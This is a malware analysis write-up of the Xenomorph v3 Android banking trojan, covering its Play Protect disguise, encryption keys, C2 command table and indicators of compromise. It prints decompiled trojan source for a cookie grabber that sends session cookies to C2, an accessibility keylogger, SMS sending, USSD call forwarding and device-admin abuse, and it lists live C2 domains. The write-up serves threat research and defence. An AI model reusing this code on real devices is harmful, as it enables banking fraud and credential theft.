---
title: "Xenomorph V3"
date: 2024-05-06 00:00:00 +0000
categories: [Malware Analysis]
tags: [Malware Analysis, Info Stealer, APK, Android, Trojan]
---

Xenomorph has been evolving rapidly since its discovery in early 2022, adding continuous features over the months including keylogging, call forwarding, stealing cookies, and even automating fraudulent transfers through a powerful feature called the Automated Transfer System (ATS).

| Property | Value |
| ------ | ----------- |
| File Type   | APK |
| App Name   | Play Protect |
| Package Name   | com.great.calm |
| SHA-256 | 9ce2ad40f3998860ca1ab21d97ea7346bf9d26ff867fc69c4d005c477c67a899 |
| SSDEEP | 49152:grrgUCuMhTKb+/CZFLqtBOU3t95tnUAqkp3IQRRiEKfaFEjI:uTOKb+qXmBOuPUAqkpIQDGsEjI |

## Dynamic Analysis

This time Xenomorph disguises itself as a Play Protect app, pushing notifications to the user and prompting them to provide accessibility to the malware.

![app screen](assets/img/posts/2024-05-06-Xenomorph_v3/run.png)

![request permission](assets/img/posts/2024-05-06-Xenomorph_v3/access.png)

And it doesn't seem to change the way it drops the main payload to disk, a JSON packer just like the earlier version. After a quick look at the code, It's implementing the same obfuscator used in the previous version which is [Paranoid](https://github.com/MichaelRocks/paranoid). And can verify that it's still using RC4 for payload encryption in `hDpdaxQ.json` and we can also identify the key `fKkDGCo`.

![files](assets/img/posts/2024-05-06-Xenomorph_v3/files.png)

![JSON packer](assets/img/posts/2024-05-06-Xenomorph_v3/jsonpacked.png)

The Shared Preferences file seems to be modified a bit :

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="$rstr[LSTG]">com.android.launcher3.uioverrides.quicksteplauncher</string>
    <string name="$rstr[AITT]"></string>
    <string name="UninstallProtectEnabled">1</string>
    <string name="ParanoidUninstallProtectEnabled">1</string>
    <string name="$rstr[LPTG]"></string>
    <string name="$rstr[AIEN]">0</string>
    <int name="$rstr[NSIN]" value="0" />
    <string name="$rstr[FRTS]">1714641729285</string>
    <string name="key">[{class:com.android.settings.SubSettings,flags:[enabled,fullscreen,visible],package:com.android.settings,event:TYPE_WINDOW_STATE_CHANGED,keyEvent:focused,text:[Play Protect],time:1714641729630},{class:com.android.launcher3.uioverrides.QuickstepLauncher,flags:[enabled,fullscreen],package:com.android.launcher3,event:TYPE_WINDOW_STATE_CHANGED,keyEvent:focused,text:[Home screen 1 of 1],time:1714641730055},...]</string>
</map>
```

Here's an updated table with all tags compared to the previous version

| Status | Tag | Meaning |
| ------ | ------ | ----------- |
| New | FRTS | `firstRunTimestampTag` App first execution time |
| New | UninstallProtectEnabled | App implemented anti-uninstall |
| New | ParanoidUninstallProtectEnabled | App implemented paranoid obfuscator |
| New | key | Keylogger log journal (explained later [here](#fitnessaccessibilityservice-updated)) |
| New | CURD | `CookiesURL` A list of URLs to steal its user cookies |
| New | ACPRCEN | `accessibilityProcessingEnabled` |
| New | NSIN | `networkSourceIndexTag` Index of the current activated (`ActualNetworkConnection`) C2 |
| New | PPDA | `playProtectDisableAttempts` |
| New | PRPD | `preparationsDone` |
| New | MsgDefApp | `smsDefaultAppTag` |
| New | smsDefaultPackage | `smsDefaultPackageTag` |
| Same | ANCT | `ActualNetworkConnection` Currently active C2  |
| Same | LPTG | `lastProcessedScreenTag` Last processed accessbility event class name |
| Same | DSTI | `debugStateIdTag` Randomly generated UUID |
| Same | AITT | `appInjectTableTag` Table of apps/overlays injections |
| Same | LSTG | `lastScreenTag` Last accessbility event class name |
| Same | NSTG | `networkStateTag` If it greater than `0` then the malware already holds an active connection with C2 |
| Same | AIEN | `appInjectsEnabledTag` Overlay injection status (Enabled/Diabled `0`) |
| Same | AITG | `appInjectTag` Overlay injected app package name |
| Same | ABTG | `autoBackTag` I'm not sure how this and the following ones work but Xenomorph has already set accessbility event types such as `TYPE_VIEW_CLICKED`, `TYPE_WINDOW_STATE_CHANGED` to log and interact with. This one probably handles actions it can take in case if another event type occured. |
| Same | ACTG | `autoClickTag` Action to take on event occurance |
| Same | AHTG | `autoHomeTag` Action to take on event occurance |
| Same | SITG | `startIntentTag` Action to take on event occurance |
| Same | AUTG | `accessibilityUndoneTag` Action to take on event occurance |
| Same | XBTG | `batteryOptimizationDisabled` Doze mode (enabled/disabled) |
| Same | ESTG | `endlessServiceStatus` Service status flag (e.g holds value "`running`" if it's enabled). The service is responsible for the WakeLock and monitoring user presence |
| Same | NIEN | `notificationsIcEnabledTag` I believe to be a notification interception feature flag |
| Same | SID | `secureIdTag` 16 Bytes key used in securing communication between the malware and C2 with AES algorithm |
| Same | SITS | `secureIdTimestampTag` 16 bytes AES key timestamp |
| Same | SDST | `smsDefaultAppIsSetTag` A flag if Xenomorph is the SMS manager |
| Same | SIEN | `smsIcMeantToBeEnabledTag` I believe to be an SMS interception feature flag |
| Same | SSTG | `smsSavedTag` A list of saved SMS messages |
| Same | UPEN | `userPresent` Holds the value of `0` if the screen is off |
| Same | UTUI | `userTriedUninstall` Indication of user trying to delete the malicious app or disable its accessbility permission |

Another new about this version is that it uses a [PiracyChecker](https://github.com/javiersantos/PiracyChecker?tab=readme-ov-file).

This version seems to be doing a bit more network activity. Of course, all C2 are now down.

![network](assets/img/posts/2024-05-06-Xenomorph_v3/network.png)

I'll use Frida once again to check for cryptography in the sample as the earlier version used AES encryption

```bash
frida-trace -U -j javax.crypto.Cipher!* -j javax.crypto.spec.SecretKeySpec!* -f com.great.calm
```

![frida-trace](assets/img/posts/2024-05-06-Xenomorph_v3/trace.png)

I'll use Frida to hook the `Cipher.doFinal` function to fetch the key, IV and data

```python
import sys
import frida
import time

def write_data(file_prefix, data):
    current_time = round(time.time() * 1000)
    filename = f'{current_time}_{file_prefix}.bin'
    print('Writing file:', filename)
    with open(filename, 'wb') as output_file:
        output_file.write(bytearray((d % 0xFF for d in data)))

def inject_script(session):
    def on_message(message, _):
        if message['type'] == 'send':
            if 'input' in message['payload']:
                write_data('iv', message['payload']['iv'])
                write_data('input', message['payload']['input'])
            elif 'output' in message['payload']:
                write_data('output', message['payload']['output'])
            elif 'key' in message['payload']:
                write_data('key', message['payload']['key'])
            else:
                print('Unknown message: ', message)
        else:
            print('Unknown message: ', message)

    script = session.create_script("""console.log("Loading Javascript");
                                    Java.perform(() => {
                                    const Cipher = Java.use("javax.crypto.Cipher");
                                    Cipher.doFinal.overload('[B').implementation = function(arr) {
                                    send( {'input': arr, 'iv': this.getIV() });
                                    const result = this.doFinal(arr);
                                    send( {'output': result });
                                    return result;
                                    };
                                    const SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
                                    SecretKeySpec.$init.overload(
                                    "[B", "int", "int", "java.lang.String").implementation = function(
                                    arr, off, len, alg) {
                                    send( {'key': arr} );
                                    return this.$init(arr, off, len, alg);
                                    };
                                    });
                                    console.log("Javascript loaded");""")
    script.on('message', on_message)
    script.load()

def main():
    emulator = frida.get_usb_device()
    pid = emulator.spawn('com.great.calm')
    session = emulator.attach(pid)
    inject_script(session)
    emulator.resume(pid)
    sys.stdin.read()
    session.detach()

if __name__ == '__main__':
    main()
```

Here's the JavaScript script :

```javascript
console.log("Loading Javascript");

Java.perform(() => {
  const Cipher = Java.use("javax.crypto.Cipher");
  Cipher.doFinal.overload('[B').implementation = function(arr) {
    send( {'input': arr, 'iv': this.getIV() });
    const result = this.doFinal(arr);
    send( {'output': result });
    return result;
  };
  const SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
  SecretKeySpec.$init.overload(
  "[B", "int", "int", "java.lang.String").implementation = function(arr, off, len, alg) {
    send( {'key': arr} );
    return this.$init(arr, off, len, alg);
  };
});
console.log("Javascript loaded");
```

And it's the same file format as before. Containing API level, installed apps, IMEI number, model, Sample tag, and a random UID.

```json
{
  "api": 30,
  "apps": [
    "com.android.cts.priv.ctsshim",
    "com.android.internal.display.cutout.emulation.corner",
    "com.android.internal.display.cutout.emulation.double",
    "com.android.providers.telephony", ....
  ],
  "imei": "8ce186302c1f6da6",
  "model": "Unknown Android SDK built for x86",
  "numbers": [],
  "tag": "golden2801",
  "uid": "8ce186302c1f6da6"
}
```

Looks like the key hasn't even changed `5f 9d 4a 91 b0 d7 c7 b8 8c b8 b6 f7 f7 7f 0d 2e`.

## Payload Analysis

`droidlysis` provides a good overview of the sample

![droidlysis](assets/img/posts/2024-05-06-Xenomorph_v3/droidlysis.png)

![properties](assets/img/posts/2024-05-06-Xenomorph_v3/properties.png)

### Utilities

By version 3, Xenomorph added quite a number of interesting features in addition to updating some of its previous capabilities

#### 1 - Turn off Play Protect

This starts `PlayProtectActivity`, which in turn opens the device's security settings where the user can manually disable Google Play Protect.

```java
    public static boolean turnOffPlayProtect(Context context) {
        if (isScreenUnlocked(context) && isUserPresent(context) && isAccessibilityServiceEnabled(context, FitnessAccessibilityService.class)) {
            UtilLog.addToInteger(context, Constants.playProtectDisableAttempts, 1);
            Intent intent = new Intent(context, PlayProtectActivity.class);
            intent.addFlags(268435456); // FLAG_ACTIVITY_NEW_TASK
            intent.addFlags(536870912); // FLAG_ACTIVITY_CLEAR_TOP
            intent.addFlags(1073741824); // FLAG_ACTIVITY_CLEAR_TASK
            context.startActivity(intent);
            Log("turnOffPlayProtect", "Intent Started");
            return true;
        }
        return false;
    }
```

#### 2 - Admin Utils

It can add/remove itself as a device admin.

##### A- Getting Admin

```java
    public static boolean getAdmin(Context context) {
        if ("oppo".equalsIgnoreCase(Build.MANUFACTURER) || isAdminActive(context)) {
            return false;
        }
        Log("getAdmin", "Admin inactive");
        if (isScreenUnlocked(context) && isAccessibilityServiceEnabled(context, FitnessAccessibilityService.class)) {
            Intent intent = new Intent(context, AdminActivity.class);
            intent.putExtra("get", "true");
            intent.addFlags(268435456); // FLAG_ACTIVITY_NEW_TASK
            intent.addFlags(536870912); // FLAG_ACTIVITY_CLEAR_TOP
            intent.addFlags(1073741824); // FLAG_ACTIVITY_CLEAR_TASK AND FLAG_ACTIVITY_NEW_TASK
            intent.addFlags(8388608); // FLAG_RECEIVER_FOREGROUND
            context.startActivity(intent);
            Log("getAdmin", "Intent Started");
            return true;
        }
        return false;
    }
```

##### B- Remove Admin

```java
    public static boolean removeAdmin(Context context) {
        if (isAdminActive(context) && isScreenUnlocked(context) && isAccessibilityServiceEnabled(context, FitnessAccessibilityService.class)) {
            ((FitnessAccessibilityService) Objects.requireNonNull(App.getAccessibilityService())).runtimeActionsManager.add(new RuntimeAccessibilityActionRunner("clickAllowButtonNonBlocking"), UtilGlobal$$ExternalSyntheticLambda1.INSTANCE, "removeAdmin");
            Intent intent = new Intent(context, AdminActivity.class);
            intent.putExtra("get", "false");
            intent.addFlags(268435456); // FLAG_ACTIVITY_NEW_TASK
            intent.addFlags(536870912); // FLAG_ACTIVITY_CLEAR_TOP
            intent.addFlags(1073741824); // FLAG_ACTIVITY_CLEAR_TASK AND FLAG_ACTIVITY_NEW_TASK
            intent.addFlags(8388608); // FLAG_RECEIVER_FOREGROUND
            context.startActivity(intent);
            return true;
        }
        return false;
    }
```

##### C- Admin Check

```java
    public static boolean isAdminActive(Context context) {
        return ((DevicePolicyManager) context.getSystemService("device_policy")).isAdminActive(new ComponentName(context, AdminReceiver.class));
    }
```

#### 3- Application Control Utils

Xenomorph now can Run other apps on the infected device in addition to killing another app process as well.

##### A- Run an app

```java
    public static boolean startApplicationByPackage(Context context, String str) {
        try {
            context.startActivity(context.getPackageManager().getLaunchIntentForPackage(str).addFlags(268435456));
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
```

##### B- Kill an App

```java
    public static void killApplicationByPackage(Context context, String str) {
        List<ApplicationInfo> installedApplications = context.getPackageManager().getInstalledApplications(0);
        ActivityManager activityManager = (ActivityManager) context.getSystemService("activity");
        String packageName = context.getApplicationContext().getPackageName();
        for (ApplicationInfo applicationInfo : installedApplications) {
            if ((applicationInfo.flags & 1) != 1 && !applicationInfo.packageName.equals(packageName) && applicationInfo.packageName.equals(str)) {
                activityManager.killBackgroundProcesses(applicationInfo.packageName);
            }
        }
    }
```

##### C- Launch App settings (Not Implemented)

This is supposed to open the settings screen for a specific application on the infected device.

```java
    public static void openApplicationSettings(Context context, String str) {
        Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse("package:" + str));
        intent.addCategory("android.intent.category.DEFAULT");
        intent.setFlags(268435456);
        context.startActivity(intent);
    }
```

#### 4- Cookies Grabber

It starts a new intent launching the `CookieGrabberActivity` which sets up a WebView to load a specific URL (specified by the C2 and saved in `CURD` in the shared preferences). It enables JavaScript in the WebView, sets up a WebViewClient to handle page loading events, and adds a JavaScript interface (WebAppInterface) to communicate between JavaScript running in the WebView and the Android application.

When the page finishes loading (onPageFinished), it grabs cookies from the page using CookieManager, processes them, and sends them to the C2 if they contain a `sessionid` cookie.

```java
    protected void onStart() {
        super.onStart();
        this.context = this;
        try {
            WebView webView = new WebView(this);
            this.wv = webView;
            webView.getSettings().setJavaScriptEnabled(true);
            this.wv.setWebViewClient(new WebViewClient() { // from class: org.securitypolicies.setup.activities.CookieGrabberActivity.1
                @Override // android.webkit.WebViewClient
                public void onPageFinished(WebView webView2, String str) {
                    String cookie = CookieManager.getInstance().getCookie(str);
                    String[] split = CookieManager.getInstance().getCookie(str).replace(";", HttpUrl.FRAGMENT_ENCODE_SET).split(" ");
                    if (cookie.contains("sessionid")) {
                        try {
                            JSONObject jSONObject = new JSONObject();
                            for (String str2 : split) {
                                String[] split2 = str2.split("=");
                                jSONObject.put(split2[0], split2[1]);
                                UtilGlobal.Log(CookieGrabberActivity.TAG, "cookie is = " + jSONObject);
                            }
                            UtilGlobal.sendCookies(jSONObject.toString());
                        } catch (Exception e) {
                            UtilGlobal.sendCookies("cookiesGrabbingFailed");
                            UtilGlobal.Log(CookieGrabberActivity.TAG, "Cookie Grabber Error: " + e.getMessage());
                        }
                    }
                }
            });
            this.wv.addJavascriptInterface(new WebAppInterface(this), "Android");
            this.wv.loadUrl(Constants.CookiesURL);
            setContentView(this.wv);
            ((InputMethodManager) this.context.getSystemService("input_method")).restartInput(this.wv);
            UtilGlobal.settingsWriteBoolean(this, "accessibilityProcessingEnabled", false);
        } catch (Exception e) {
            e.printStackTrace();
            finish();
        }
    }
```

#### 5- SMS Utils (Added Feature)

in addition to its previous capability of grabbing SMS, now it can send an SMS to a target phone number.

```java
    public static void sendSMS(String str, String str2) {
        ApiOperationController apiOperationController = new ApiOperationController();
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendMultipartTextMessage(str, null, smsManager.divideMessage(str2), null, null);
            apiOperationController.sendRequest(App.getContext(), new ApiSimpleStatePayload("send_sms", true), true);
        } catch (Exception unused) {
            apiOperationController.sendRequest(App.getContext(), new ApiSimpleStatePayload("send_sms", false), true);
        }
    }
```

#### 6- Calls Utils

Added 2 new features of call forwarding to a number specified by the C2 and dialing a USSD code.

```java
    public static void make_ussd(Context context, String str) {
        ApiOperationController apiOperationController = new ApiOperationController();
        try {
            dialUssd(context, str, 0);
            apiOperationController.sendRequest(App.getContext(), new ApiSimpleStatePayload("make_ussd", true), true);
        } catch (Exception unused) {
            apiOperationController.sendRequest(App.getContext(), new ApiSimpleStatePayload("make_ussd", false), true);
        }
    }

    public static void call_forward(Context context, String str) {
        ApiOperationController apiOperationController = new ApiOperationController();
        try {
            dialUssd(context, "**21*" + str + "*#", 0);
            apiOperationController.sendRequest(App.getContext(), new ApiSimpleStatePayload("call_forward", true), true);
        } catch (Exception unused) {
            apiOperationController.sendRequest(App.getContext(), new ApiSimpleStatePayload("call_forward", false), true);
        }
    }

    public static void dialUssd(Context context, String str, int i) {
        if (str.length() == 0) {
            return;
        }
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
        TelephonyManager createForSubscriptionId = telephonyManager.createForSubscriptionId(2);
        if (i != 0) {
            telephonyManager = createForSubscriptionId;
        }
        if (context.checkSelfPermission("android.permission.CALL_PHONE") != 0) {
            return;
        }
        telephonyManager.sendUssdRequest(str, new TelephonyManager.UssdResponseCallback() { // from class: org.securitypolicies.setup.utilities.UtilGlobal.1
            @Override // android.telephony.TelephonyManager.UssdResponseCallback
            public void onReceiveUssdResponse(TelephonyManager telephonyManager2, String str2, CharSequence charSequence) {
                super.onReceiveUssdResponse(telephonyManager2, str2, charSequence);
                Log.d("TAG", "onReceiveUssdResponse:  Ussd Response = " + charSequence.toString().trim());
            }

            @Override // android.telephony.TelephonyManager.UssdResponseCallback
            public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager2, String str2, int i2) {
                super.onReceiveUssdResponseFailed(telephonyManager2, str2, i2);
                Log.d("TAG", "onReceiveUssdResponseFailed: " + i2 + str2);
            }
        }, new Handler());
    }
```

#### 7- Checking permissions (Updated)

It now checks if it's admin, if Google Play Protect is disabled and if it has accessibility permissions.

Again, A list of generic permissions can be noticed in the code snippet below alongside the AES key and a list of C2s.

```java
    public static String[] getPermissionsStats(Context context) {
        ArrayList arrayList = new ArrayList();
        if (isSmsDefaultAppSet(context)) {
            arrayList.add("sms_manager");
        }
        if (isNotificationServiceEnabled(context)) {
            arrayList.add("notification_manager");
        }
        if (isAdminActive(context)) {
            arrayList.add("admin_active");
        }
        if (isPlayProtectDisabled(context)) {
            arrayList.add("play_protect_disabled");
        }
        if (isIgnoringBatteryOptimizations(context)) {
            arrayList.add("ignoring_battery_optimizations");
        }
        if (checkPermissions(context)) {
            arrayList.add("generic_permissions");
        }
        if (isAccessibilityServiceEnabled(context, FitnessAccessibilityService.class)) {
            arrayList.add("accessibility");
        }
        return (String[]) arrayList.toArray(new String[0]);
    }
```

```java
    static {
        String[] strArr = new String[10];
        strArr[0] = "android.permission.READ_SMS";
        strArr[1] = "android.permission.RECEIVE_SMS";
        strArr[2] = "android.permission.WAKE_LOCK";
        strArr[3] = "android.permission.RECEIVE_BOOT_COMPLETED";
        strArr[4] = "android.permission.ACCESS_NETWORK_STATE";
        strArr[5] = "android.permission.INTERNET";
        strArr[6] = Build.VERSION.SDK_INT <= 29 ? "android.permission.READ_PHONE_STATE" : null;
        strArr[7] = Build.VERSION.SDK_INT >= 29 ? "android.permission.USE_FULL_SCREEN_INTENT" : null;
        strArr[8] = Build.VERSION.SDK_INT >= 29 ? "android.permission.FOREGROUND_SERVICE" : null;
        strArr[9] = Build.VERSION.SDK_INT > 29 ? "android.permission.READ_PHONE_NUMBERS" : null;
        permissions = strArr;
        testKey = UtilEncryption.hexStringToBytes("5f9e4a92b1d8c8b98db9b7f8f8800d2e");
        List<String> asList = Arrays.asList("dedeperesere.xyz", "vldeolan.com", "cofi.hk");
        apis = asList;
        apiSources = Constants$$ExternalSyntheticBackport1.m(new Map.Entry[]{Constants$$ExternalSyntheticBackport0.m(0, new StringApiUrlSource(asList)), Constants$$ExternalSyntheticBackport0.m(1, new ExternalMnemonicResourceApiUrlSource("https://t.me/xxtetammi1k", "🖤🖤🖤", "🖤🖤🖤"))});
        accessibilityCompressKeywords = Constants$$ExternalSyntheticBackport1.m(new Map.Entry[]{Constants$$ExternalSyntheticBackport0.m("quicksteplauncher", "qs"), Constants$$ExternalSyntheticBackport0.m("uioverrides", "uo"), Constants$$ExternalSyntheticBackport0.m("systemui", "su"), Constants$$ExternalSyntheticBackport0.m("android", "a"), Constants$$ExternalSyntheticBackport0.m("widget", "w"), Constants$$ExternalSyntheticBackport0.m("miui", "m"), Constants$$ExternalSyntheticBackport0.m("xiaomi", "x"), Constants$$ExternalSyntheticBackport0.m("launcher", "l"), Constants$$ExternalSyntheticBackport0.m("securitycenter", "sc"), Constants$$ExternalSyntheticBackport0.m("settings", "st"), Constants$$ExternalSyntheticBackport0.m("com", "c")});
    }
```

#### 8- Phone numbers grabber (Changed)

Same functionality but a different implementation for grabbing phone numbers from the infected device

```java
    public static String[] getTelephonyInfo(Context context) {
        ArrayList<SubscriptionModel> arrayList = new ArrayList<SubscriptionModel>() { // from class: org.securitypolicies.setup.utilities.UtilGlobal.2
        };
        ArrayList<String> arrayList2 = new ArrayList<String>() { // from class: org.securitypolicies.setup.utilities.UtilGlobal.3
        };
        try {
            List<SubscriptionInfo> activeSubscriptionInfoList = SubscriptionManager.from(context).getActiveSubscriptionInfoList();
            if (activeSubscriptionInfoList != null) {
                for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                    arrayList.add(new SubscriptionModel(subscriptionInfo));
                }
            }
        } catch (SecurityException e) {
            Log("getTelephonyInfo", "Exception thrown");
            e.printStackTrace();
        }
        for (SubscriptionModel subscriptionModel : arrayList) {
            if (subscriptionModel.phone != null && !subscriptionModel.phone.isEmpty()) {
                arrayList2.add(subscriptionModel.phone);
            }
        }
        return (String[]) arrayList2.toArray(new String[0]);
    }
```

The old code is still there tho :

![old code](assets/img/posts/2024-05-06-Xenomorph_v3/old.png)

#### 9- Screen Brightness Control

It has the ability to control device screen brightness to dim the screen while running `AccessibilityTask` and disabling Google Play Protect then returning it to its original state.

```java
    public static void setScreenBrightness(Context context, int i) {
        if (Settings.System.canWrite(context)) {
            Log("setScreenBrightness", "Can write");
        } else {
            Log("setScreenBrightness", "Can not write");
        }
        try {
            Settings.System.putInt(context.getContentResolver(), "screen_brightness_mode", 0);
            Settings.System.putInt(context.getContentResolver(), "screen_brightness", i);
        } catch (Exception unused) {
            Log("setScreenBrightness", "Exception when trying to write");
        }
    }

    public static int getScreenBrightness(Context context) {
        if (Settings.System.canWrite(context)) {
            Log("setScreenBrightness", "Can write");
        } else {
            Log("setScreenBrightness", "Can not write");
        }
        try {
            return Settings.System.getInt(context.getContentResolver(), "screen_brightness");
        } catch (Exception unused) {
            Log("setScreenBrightness", "Exception when trying to write");
            return 0;
        }
    }
```

For that, it requests Write permissions :

```java
    public static void requestSettingsWritePermission(Context context) {
        Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
        intent.setData(Uri.parse("package:" + context.getPackageName()));
        intent.addFlags(268435456);
        intent.addFlags(8388608);
        context.startActivity(intent);
    }
```

#### 10- Self Removing

Now it has the ability to remove itself from the system.

```java
    public static void selfRemove(Context context) {
        SettingsWrite(context, Constants.globalMTBE, "0");
        SettingsWrite(context, Constants.uninstallProtectionEnabled, "0");
        ((DevicePolicyManager) context.getSystemService("device_policy")).removeActiveAdmin(new ComponentName(context, AdminReceiver.class));
        ((FitnessAccessibilityService) Objects.requireNonNull(App.getAccessibilityService())).runtimeActionsManager.add(new RuntimeAccessibilityActionRunner("clickAllowButtonNonBlocking"), UtilGlobal$$ExternalSyntheticLambda0.INSTANCE, "selfRemove");
        Intent intent = new Intent("android.intent.action.DELETE");
        intent.addFlags(268435456);
        intent.setData(Uri.parse("package:" + context.getPackageName()));
        context.startActivity(intent);
    }
```

#### 11- Executing C2 Commands

Here's a list of all supported commands/capabilities (new and old) :

| Status | Command | Action |
| ------ | ------ | ------- |
| Newly Added | app_delete | Not Implemented |
| Newly Added | app_clear_cache | Not Implemented |
| Newly Implemented | self_cleanup | Removes itself from infected device |
| Newly Implemented | fg_enable | Enable App notification channel |
| Newly Implemented | fg_disable | Disable App notification channel |
| Newly Implemented | app_kill | Stop an application providing the package name |
| Newly Added | socks_start | Start a socks server |
| Newly Added | socks_stop | Stop the socks server |
| Newly Added | app_start | Launch an application providing package name |
| Newly Added | show_push | Push a notification |
| Newly Added | cookies_handler | Start cookies grabber specifying URLs to grab its cookies |
| Newly Added | send_sms | Send an sms text to a number both specified by the C2 |
| Newly Added | make_ussd | Run a USSD code specified by the C2 |
| Newly Added | call_forward | Forwards all cals to a number |
| Newly Added | execute_rum | Runs a "RuntimeAccessibilityModules" |
| Not Changed | sms_log | Sends user SMS back to C2 in the following form : `SmsModel {id = "Sender ID/Name", recipient = "Recipient", message = "Message Body", readState = "Message Read Status", time = "Message timestamp", type = " Inbox/Sent/Draft/Outbox/Failed/Queued/Unknown "}` |
| Not Changed | notif_ic_disable | Disable notification listener |
| Not Changed | notif_ic_enable | Enable notification listener |
| Not Changed | sms_ic_disable | Disable SMS listener |
| Not Changed | sms_ic_enable | Enable SMS listener |
| Not Changed | inj_enable | Enable overlay injections |
| Not Changed | inj_disable | Disable overlay injections |
| Not Changed | app_list | Report back with a list of package names of installed apps |
| Not Changed | inj_update | Updates the injections list |
| Not Changed | inj_list | Not Implemented |
| Not Changed | self_kill | Not Implemented |
| Not Changed | notif_ic_update | Not Implemented |
| Not Changed | sms_ic_update | Not Implemented |
| Not Changed | sms_ic_list | Not Implemented |
| Not Changed | notif_ic_list | Not Implemented |

### RuntimeAccessibilityModules (RUM)

Automated Transfer System (ATS) is a new technique fraudsters leverage to bypass the latest anti-fraud systems. Such systems can automatically extract credentials, and account balances, initiate transactions, obtain MFA tokens and finalize the fund transfers, without the need for human interaction from an operator.

The modules are received from the C2 in JSON format

```java
public class RuntimeAccessibilityModule {
    @SerializedName("events")
    public Integer[] events;
    @SerializedName("module")
    public String module;
    @SerializedName("operations")
    public RuntimeAccessibilityStep[] operations;
    @SerializedName("parameters")
    public List<String> parameters;
    @SerializedName("requires")
    public RuntimeAccessibilityStep[] requires;
    @SerializedName("terminator")
    public RuntimeAccessibilityTerminatorParameters terminator;
    @SerializedName("triggerConditions") 
    public RuntimeAccessibilityStep[] triggerConditions;
    @SerializedName("version")
    public Integer version;
}
```

### FitnessAccessibilityService (Updated)

Added a keylogger :

```java
    private void logAccessibilityKeylogger(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent.getText() == null) {
            return;
        }
        try {
            String format = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US).format(Calendar.getInstance().getTime());
            int eventType = accessibilityEvent.getEventType();
            if (eventType != 1) {
                if (eventType != 8) {
                    if (eventType == 16) {
                        if (!accessibilityEvent.getText().toString().equals(HttpUrl.FRAGMENT_ENCODE_SET)) {
                            UtilGlobal.Log("logAccessibilityKeylogger", format + "[Text entered]" + accessibilityEvent.getText().toString());
                        }
                    } else {
                        try {
                            if (accessibilityEvent.getText().toString().length() >= 3) {
                                UtilGlobal.Log("logAccessibilityKeylogger", format + "[Focused]" + accessibilityEvent.getText().toString().length() + " # " + accessibilityEvent.getText().toString());
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            UtilGlobal.Log(TAG, e.getMessage());
                        }
                    }
                } else if (!accessibilityEvent.getText().toString().equals(HttpUrl.FRAGMENT_ENCODE_SET)) {
                    UtilGlobal.Log("logAccessibilityKeylogger", format + "[Focused]" + accessibilityEvent.getText().toString());
                }
            } else if (!accessibilityEvent.getText().toString().equals(HttpUrl.FRAGMENT_ENCODE_SET)) {
                UtilGlobal.Log("logAccessibilityKeylogger", format + "[Click]" + accessibilityEvent.getText().toString());
            }
        } catch (Exception e2) {
            e2.printStackTrace();
            UtilGlobal.Log(TAG, e2.getMessage());
        }
    }
```

All user actions will be logged and saved in the Shared Preferences with the tag `key`.

```java
    private void writeKeyloggerJournal(AccessibilityEvent accessibilityEvent) {
        try {
            if (accessibilityEvent.getText() != null && !accessibilityEvent.getText().isEmpty()) {
                int eventType = accessibilityEvent.getEventType();
                String str = "focused";
                if (eventType == 1) {
                    str = "clicked";
                } else if (eventType != 8 && eventType == 16) {
                    str = "entered";
                }
                if (accessibilityEvent.getText() != null) {
                    UtilLog.addToList(this, "key", new KeyloggerLogJournalEntry(accessibilityEvent, accessibilityEvent.getText().toString(), str));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            UtilGlobal.Log(TAG, e.getMessage());
        }
    }
```

The `key` contains the accessibility class and event, package name, viewId, text, event type and flags. Flags include the accessibility event being a fullscreen, password, scrollable, etc...

## IOCs

* URLs

  ```text
  "dedeperesere.xyz", "vldeolan.com", "cofi.hk", "team.mi1kyway.tech"
  ```

* Files
  + `hDpdaxQ.json` SHA-256 : `e70c20e42897de68174d9906dc3baeb73f3849689730735c7bcaa31a2a575847`, SSDEEP : 24576:1jymLxhd1KZVvGXSm50mKTcEn7jR3olhiO:1jLxhrcA50j3714TiO
  + `ThomYorkeARatsNest.xml`
